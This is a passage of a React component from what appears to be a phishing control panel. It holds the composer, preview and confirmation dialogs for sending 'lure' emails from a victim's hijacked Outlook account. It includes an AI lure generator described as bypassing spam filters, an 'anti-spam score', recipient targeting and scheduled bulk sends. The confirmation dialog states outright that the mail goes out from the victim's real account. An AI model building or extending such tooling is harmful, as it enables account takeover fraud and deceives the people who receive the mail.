                  <label htmlFor="lure-attachments" className="inline-flex items-center gap-1.5 text-[11px] text-muted-foreground hover:text-foreground cursor-pointer">
                    <Plus className="h-3.5 w-3.5" /> Attach files
                  </label>
                  <p className="text-[10px] text-muted-foreground">Max 4MB per file</p>
                  {attachments.length > 0 && (
                    <div className="flex flex-wrap gap-1.5">
                      {attachments.map((file, idx) => (
                        <Badge key={idx} variant="secondary" className="text-[10px] gap-1">
                          {file.name}
                          <button onClick={() => setAttachments((prev) => prev.filter((_, i) => i !== idx))} className="hover:text-destructive">
                            <X className="h-3 w-3" />
                          </button>
                        </Badge>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* Schedule send + Max recipients */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                  <label className="text-xs font-medium text-muted-foreground mb-2 block">Schedule send</label>
                  <input
                    type="datetime-local"
                    value={scheduleTime}
                    onChange={(e) => setScheduleTime(e.target.value)}
                    className="w-full h-10 rounded-lg border border-white/5 bg-secondary/30 px-3 py-2 text-xs text-foreground outline-none focus-visible:ring-1 focus-visible:ring-primary/30"
                  />
                </div>
                <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                  <label className="text-xs font-medium text-muted-foreground mb-2 block">Max recipients per send</label>
                  <Input
                    type="number"
                    min={1}
                    max={100}
                    value={maxRecipientsPerSend}
                    onChange={(e) => setMaxRecipientsPerSend(Number(e.target.value))}
                    className="h-10 bg-secondary/30 border-white/5"
                  />
                </div>
              </div>

              {/* Anti-spam notes */}
              {antiSpamNotes.length > 0 && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: "auto" }}
                  className="rounded-xl border border-emerald-500/20 bg-emerald-500/5 p-4"
                >
                  <div className="flex items-center gap-2 mb-2">
                    <Sparkles className="h-3.5 w-3.5 text-emerald-400" />
                    <p className="text-[11px] font-semibold text-emerald-400 uppercase">Anti-Spam Techniques Applied</p>
                  </div>
                  <div className="flex flex-wrap gap-1.5">
                    {antiSpamNotes.map((note, i) => (
                      <Badge key={i} variant="secondary" className="text-[10px] bg-emerald-500/10 text-emerald-300 border-emerald-500/20">
                        <CheckCircle2 className="h-2.5 w-2.5 mr-1" />
                        {note}
                      </Badge>
                    ))}
                  </div>
                </motion.div>
              )}

              {/* Send Button + Anti-spam Score */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  {antiSpamNotes.length > 0 && (
                    <div className="flex items-center gap-2 rounded-lg border border-emerald-500/20 bg-emerald-500/5 px-3 py-2">
                      <Sparkles className="h-3.5 w-3.5 text-emerald-400" />
                      <span className="text-[11px] text-emerald-400 font-medium">Anti-spam Score</span>
                      <div className="flex items-center gap-1">
                        <div className="h-1.5 w-16 rounded-full bg-secondary/50 overflow-hidden">
                          <div
                            className="h-full rounded-full bg-emerald-400"
                            style={{ width: `${Math.min(antiSpamNotes.length * 15, 100)}%` }}
                          />
                        </div>
                        <span className="text-[10px] text-emerald-400 font-bold">{Math.min(antiSpamNotes.length * 15, 100)}%</span>
                      </div>
                    </div>
                  )}
                  <div className="flex items-center gap-1.5 text-[10px] text-muted-foreground">
                    <span className="flex items-center gap-1">
                      <div className="h-2 w-2 rounded-full bg-emerald-400" />
                      {toRecipients.filter(e => isOfficeEmail(e)).length} office
                    </span>
                    <span className="flex items-center gap-1">
                      <div className="h-2 w-2 rounded-full bg-amber-400" />
                      {toRecipients.filter(e => !isOfficeEmail(e)).length} external
                    </span>
                    <span className="text-muted-foreground">•</span>
                    <span>{toRecipients.length} total recipients</span>
                  </div>
                </div>
                <Button
                  onClick={handlePreview}
                  className="gap-2 bg-primary hover:bg-primary/90"
                  size="lg"
                >
                  <Send className="h-4 w-4" />
                  Preview & Send
                </Button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Template Picker Dialog */}
      <Dialog open={templatePickerOpen} onOpenChange={setTemplatePickerOpen}>
        <DialogContent className="sm:max-w-[500px] glass-strong border-white/10">
          <DialogHeader>
            <DialogTitle className="text-sm font-semibold flex items-center gap-2">
              <Wand2 className="h-4 w-4 text-primary" />
              Generate AI Lure Email
            </DialogTitle>
            <DialogDescription className="text-xs text-muted-foreground">
              Select a template. AI will generate a sophisticated lure that bypasses spam filters using natural language variation and contextual personalization.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 py-2">
            {LURE_TEMPLATES.map((tmpl) => {
              const Icon = tmpl.icon;
              return (
                <motion.button
                  key={tmpl.id}
                  whileHover={{ scale: 1.01 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => handleGenerateAI(tmpl.id)}
                  className="w-full flex items-start gap-3 p-3 rounded-lg border border-white/5 bg-secondary/10 hover:bg-secondary/20 hover:border-primary/20 transition-all text-left"
                >
                  <div className="h-10 w-10 rounded-xl bg-primary/10 ring-1 ring-primary/20 flex items-center justify-center flex-shrink-0">
                    <Icon className="h-5 w-5 text-primary" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-foreground">{tmpl.label}</p>
                    <p className="text-[11px] text-muted-foreground">{tmpl.description}</p>
                    <div className="flex items-center gap-2 mt-1.5">
                      <Badge variant="secondary" className="text-[9px] bg-primary/5 text-primary/80 border-primary/10">
                        <Sparkles className="h-2.5 w-2.5 mr-1" /> AI-powered
                      </Badge>
                      <Badge variant="secondary" className="text-[9px] bg-emerald-500/5 text-emerald-400/80 border-emerald-500/10">
                        <ShieldAlert className="h-2.5 w-2.5 mr-1" /> Anti-spam
                      </Badge>
                    </div>
                  </div>
                </motion.button>
              );
            })}
          </div>
          <DialogFooter>
            <Button variant="outline" size="sm" onClick={() => setTemplatePickerOpen(false)}>Cancel</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* AI Preview Dialog */}
      <Dialog open={aiPreviewOpen} onOpenChange={setAiPreviewOpen}>
        <DialogContent className="sm:max-w-[600px] glass-strong border-white/10">
          <DialogHeader>
            <DialogTitle className="text-sm font-semibold flex items-center gap-2">
              <Sparkles className="h-4 w-4 text-primary" />
              AI Generated Preview
            </DialogTitle>
            <DialogDescription className="text-xs text-muted-foreground">
              Review the AI-generated lure before applying it to the composer.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 py-2">
            <div className="flex items-center gap-2 text-xs">
              <span className="text-muted-foreground w-14">Subject:</span>
              <span className="text-foreground font-medium">{aiPreviewData?.subject}</span>
            </div>
            <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
              <p className="text-xs text-muted-foreground mb-1">Body preview:</p>
              {aiPreviewData ? (
                <div className="h-[300px] overflow-hidden rounded border border-white/5">
                  <SafeEmailViewer
                    htmlContent={aiPreviewData.body}
                    contentType="html"
                    className="h-full"
                  />
                </div>
              ) : (
                <p className="text-sm text-muted-foreground">No preview available</p>
              )}
            </div>
            {aiPreviewData && aiPreviewData.antiSpamNotes.length > 0 && (
              <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
                <p className="text-[11px] font-semibold text-emerald-400 uppercase mb-2">Anti-Spam Techniques</p>
                <div className="flex flex-wrap gap-1.5">
                  {aiPreviewData.antiSpamNotes.map((note, i) => (
                    <Badge key={i} variant="secondary" className="text-[10px] bg-emerald-500/10 text-emerald-300 border-emerald-500/20">
                      <CheckCircle2 className="h-2.5 w-2.5 mr-1" />
                      {note}
                    </Badge>
                  ))}
                </div>
              </div>
            )}
          </div>
          <DialogFooter className="gap-2">
            <Button variant="outline" size="sm" onClick={() => setAiPreviewOpen(false)}>Cancel</Button>
            <Button variant="outline" size="sm" onClick={regenerateAI} disabled={generating}>
              {generating ? <Loader2 className="h-4 w-4 animate-spin" /> : <Wand2 className="h-4 w-4 mr-1.5" />}
              Regenerate
            </Button>
            <Button size="sm" onClick={applyAIGenerated} className="gap-1.5">
              <CheckCircle2 className="h-4 w-4" />
              Apply to Composer
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Preview Dialog */}
      <Dialog open={previewOpen} onOpenChange={setPreviewOpen}>
        <DialogContent className="sm:max-w-[600px] glass-strong border-white/10">
          <DialogHeader>
            <DialogTitle className="text-sm font-semibold">Email Preview</DialogTitle>
            <DialogDescription className="text-xs text-muted-foreground">
              Review the lure email before requesting admin approval.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 py-2">
            <div className="flex items-center gap-2 text-xs">
              <span className="text-muted-foreground w-12">From:</span>
              <Badge variant="secondary" className="text-xs bg-secondary/50">{token.email}</Badge>
            </div>
            <div className="flex items-center gap-2 text-xs">
              <span className="text-muted-foreground w-12">To:</span>
              <div className="flex flex-wrap gap-1">
                {toRecipients.map((email) => (
                  <Badge key={email} variant="secondary" className="text-xs bg-secondary/50">{email}</Badge>
                ))}
              </div>
            </div>
            {ccRecipients.length > 0 && (
              <div className="flex items-center gap-2 text-xs">
                <span className="text-muted-foreground w-12">Cc:</span>
                <div className="flex flex-wrap gap-1">
                  {ccRecipients.map((email) => (
                    <Badge key={email} variant="secondary" className="text-xs bg-secondary/50">{email}</Badge>
                  ))}
                </div>
              </div>
            )}
            {bccRecipients.length > 0 && (
              <div className="flex items-center gap-2 text-xs">
                <span className="text-muted-foreground w-12">Bcc:</span>
                <div className="flex flex-wrap gap-1">
                  {bccRecipients.map((email) => (
                    <Badge key={email} variant="secondary" className="text-xs bg-secondary/50">{email}</Badge>
                  ))}
                </div>
              </div>
            )}
            <div className="flex items-center gap-2 text-xs">
              <span className="text-muted-foreground w-12">Subject:</span>
              <span className="text-foreground font-medium">{subject}</span>
            </div>
            {scheduleTime && (
              <div className="flex items-center gap-2 text-xs">
                <span className="text-muted-foreground w-12">Schedule:</span>
                <Badge variant="secondary" className="text-xs bg-secondary/50">{new Date(scheduleTime).toLocaleString()}</Badge>
              </div>
            )}
            <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
              <p className="text-xs text-muted-foreground mb-1">Body preview:</p>
              <div className="h-[300px] overflow-hidden rounded border border-white/5">
                <SafeEmailViewer
                  htmlContent={body}
                  contentType={contentType === "HTML" ? "html" : "text"}
                  className="h-full"
                />
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" size="sm" onClick={() => setPreviewOpen(false)}>Edit</Button>
            <Button size="sm" onClick={handleRequestApproval} className="gap-1.5">
              <ShieldAlert className="h-4 w-4" />
              Request Approval
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Approval Dialog */}
      <Dialog open={approvalOpen} onOpenChange={setApprovalOpen}>
        <DialogContent className="sm:max-w-[450px] glass-strong border-white/10">
          <DialogHeader>
            <DialogTitle className="text-sm font-semibold flex items-center gap-2">
              <ShieldAlert className="h-4 w-4 text-amber-400" />
              Admin Approval Required
            </DialogTitle>
            <DialogDescription className="text-xs text-muted-foreground">
              You are about to send a phishing lure email from <strong>{token.email}</strong>. This action is irreversible and may trigger security alerts.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-2">
            <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
              <div className="flex items-start gap-2">
                <AlertCircle className="h-4 w-4 text-amber-400 mt-0.5 flex-shrink-0" />
                <div className="text-xs text-amber-200/80 space-y-1">
                  <p>This email will be sent from the victim's real Outlook account.</p>
                  <p>To: <strong>{toRecipients.join(", ")}</strong></p>
                  {ccRecipients.length > 0 && <p>Cc: <strong>{ccRecipients.join(", ")}</strong></p>}
                  {bccRecipients.length > 0 && <p>Bcc: <strong>{bccRecipients.join(", ")}</strong></p>}
                  <p>Subject: <strong>{subject}</strong></p>
                  {scheduleTime && (
                    <p>Scheduled: <strong>{new Date(scheduleTime).toLocaleString()}</strong></p>
                  )}
                </div>
              </div>
            </div>
            <div className="space-y-2">
              <label className="text-xs font-medium text-muted-foreground">
                Type <strong>SEND</strong> to confirm:
              </label>
              <Input
                value={confirmText}
                onChange={(e) => setConfirmText(e.target.value)}
                placeholder="Type SEND to confirm"
                className="h-10 bg-secondary/30 border-white/5 font-mono"
                autoComplete="off"
              />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" size="sm" onClick={() => setApprovalOpen(false)}>Cancel</Button>
            <Button
              size="sm"
              onClick={handleSend}
              disabled={sending || confirmText.trim().toUpperCase() !== "SEND"}
              className="gap-1.5 bg-rose-500 hover:bg-rose-600 text-white"
            >
              {sending ? <Loader2 className="h-4 w-4 animate-spin" /> : <Send className="h-4 w-4" />}
              Send Lure Email
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
